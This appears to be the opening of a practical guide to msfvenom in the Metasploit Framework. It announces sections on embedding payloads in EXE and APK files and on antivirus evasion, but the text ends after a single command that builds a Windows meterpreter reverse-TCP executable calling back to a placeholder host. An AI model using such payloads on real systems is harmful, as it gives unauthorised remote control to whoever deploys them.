# Msfvenom Practical Guide

## Introduction

Msfvenom is a powerful tool within the Metasploit Framework used for generating payloads. This practical guide will walk you through the process of generating standalone payloads and listeners for various platforms, embedding payloads into executable files (exe) and Android applications (APK), and creating fully-undetectable payloads using Shellter or other antivirus evasion techniques.

## Table of Contents

1. [Setting Up Metasploit](#setting-up-metasploit)
2. [Generating Standalone Payloads](#generating-standalone-payloads)
3. [Embedding Payloads to Exe and APK](#embedding-payloads)
4. [Creating Fully-Undetectable Payloads](#fully-undetectable-payloads)

## Setting Up Metasploit

Ensure you have Metasploit installed and configured on your system. If not, refer to the official documentation for installation instructions: [Metasploit Framework Installation](https://metasploit.help.rapid7.com/docs/metasploit-framework-installation)

## Generating Standalone Payloads

Use the following command to generate a basic Windows executable payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f exe > payload.exe
